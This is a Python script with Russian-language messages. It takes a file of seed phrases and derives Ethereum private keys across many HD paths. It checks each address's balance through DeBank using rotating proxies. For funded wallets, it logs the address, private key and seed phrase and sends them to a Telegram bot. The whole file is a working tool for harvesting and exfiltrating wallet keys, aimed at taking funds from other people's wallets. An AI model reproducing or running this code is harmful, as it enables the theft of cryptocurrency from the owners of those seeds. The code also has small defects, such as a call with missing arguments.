import grequests
from datetime import datetime
import json
import os
import time
import random
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
from web3 import Web3
from web3 import Web3
from web3.middleware import geth_poa_middleware
from web3.providers.auto import load_provider_from_uri
from eth_account import Account
import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback


binance_testnet_rpc_url = "https://eth-mainnet.public.blastapi.io" 
w3 = Web3(Web3.HTTPProvider(binance_testnet_rpc_url))
print(f"Is connected: {w3.is_connected()}")  
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
w3.eth.account.enable_unaudited_hdwallet_features()

Account.enable_unaudited_hdwallet_features()

def getseeds(wordlists):
    with open(wordlists, 'r', encoding='utf-8') as file:
        seed_phrases = file.read().splitlines()
        return seed_phrases


def sendBotMsg(msg, token_bot, chat_id):
    if token_bot:
        try:
            requests.post(f"https://api.telegram.org/bot{token_bot}/sendmessage?chat_id={chat_id}&text={msg}")
        except:
            print("netu tokena")


PROXY_RACK_DNS = []

def get_proxies():
    print('***Проверяю наличие/добавление прокси!***' '\n')
    try:
        current_dir = os.path.abspath(os.path.dirname(__file__))
        proxy_file = os.path.join(current_dir, 'prox.txt')
        with open(proxy_file, 'r', encoding='latin1') as f:
            for line in f:
                PROXY_RACK_DNS.append(line.strip())
        print('***Прокси-файл найден и обновлен***' '\n')
        return PROXY_RACK_DNS
    except Exception as e:
        print(f'Товарищ ошибка! Не найден файл с прокси!Проверь наличие файла prox.txt {e}' '\n')
time.sleep(1)
get_proxies()



def request_word(addr, PROXY_RACK_DNS):
    urls = [
        f'https://api.debank.com/user?id={addr}',
    ]

    success = False
    while not success:
        try:
            time.sleep(1)
            current_proxy = random.choice(PROXY_RACK_DNS)
            print(f"Пробую подключение прокси: {current_proxy}" '\n')
            rs = (grequests.get(u, proxies={"https": f"http://{current_proxy}"}, timeout=10) for u in urls)
            response = grequests.map(rs, size=5)
            if None in response:
                print(f"Запрос с {current_proxy} отклонен, меняю прокси..." '\n')
                continue
            if all(r.status_code == 200 for r in response):
                print("Запросы приняты в обработку." '\n')
                break
            for r in response:
                if r.status_code == 200:
                    try:
                        json_data = r.json()
                        if json_data:
                            print(f"Запрос удачен: Прокси: {current_proxy}")
                            break
                        else:
                            print(f"Запрос пустой: Прокси: {current_proxy}")
                            break
                    except:
                        print(f"Ошибка парсинга контента: Прокси: {current_proxy}, повторный запрос...")
                        break
                else:
                    print(f'Ошибка {r.status_code} с прокси {current_proxy}, повторный запрос...')
                    current_proxy = random.choice(PROXY_RACK_DNS)
                    break
        except StopIteration:
            msg = f'Все прокси израсходованы, обнови файл прокси'
            sendBotMsg(msg)
            success = True
            raise ValueError("Все прокси израсходованы, обнови файл прокси")

    return response

def check_wall(seed_phrase, num_children, path_range, result_queue, token_bot, chat_id):
    def continue_search(addr):
        print(f"Кошелек {addr} пуст, продолжаю поиск...\n")
        return 

    try:
        address_range = num_children
        for i in range(path_range):
            for j in range(address_range):
                current_path = f"m/44'/60'/0'/{i}/{j}"
                account = w3.eth.account.from_mnemonic(seed_phrase, account_path=current_path)
                addr = account.address
                private_key = account._private_key
                print(f"Address: {addr} | Private key: {private_key.hex()}  | Path: {current_path} | Seed : {seed_phrase}")
                response = request_word(addr, PROXY_RACK_DNS)
                res_dic = response[0].json()
                res_str = json.dumps(res_dic)
                obj = json.loads(res_str)
                debank = obj.get('data', {}).get('user', {}).get('stats', {}).get('top_coins', [])

                if not debank:
                    if continue_search(addr):
                        return

                with open('result_eth_parse/eth_parse.txt', 'a', encoding='utf-8') as w:
                    for item in debank:
                        symbol = item.get('symbol')
                        usd_value = item.get('usd_value')
                        symb = f'{symbol} | {usd_value}'
                        if symbol and usd_value:
                            print(f"{symb}")
                            msg = f'Address: {addr} | Balance coins: Symbol: {symb} $ usd | Private key: {private_key.hex()}  | Path: {current_path} | Seed : {seed_phrase}"\n\n'
                            sendBotMsg(msg, token_bot, chat_id)
                            w.write(
                                f'Address: {addr} | Balance coins: Symbol: {symb} $ usd| Private key: {private_key.hex()}  | Path: {current_path} | Seed : {seed_phrase}"\n\n')
                        else:
                            print("Отсутствует 'symbol' или 'usd_value' для монеты.")
                            if continue_search(addr):
                                return

        result_queue.put((seed_phrase, debank, None))
        print(f"Адреса в {path_range} областях в кол-ве {address_range} в каждой области сгенерированны")
    except Exception as e:
        traceback.print_exc()
        result_queue.put((seed_phrase, None, str(e)))
        print(f'{e}')

def recoveraddr(seed_phrases, num_children, threads, token_bot, chat_id):
    result_queue = Queue()
    path_range = int(input('Введи число итераций в областей:  '))
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_wall, seed_phrase, num_children, path_range, result_queue, token_bot, chat_id) for seed_phrase in seed_phrases]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f'Ошибка в потоке: {e}')

    return result_queue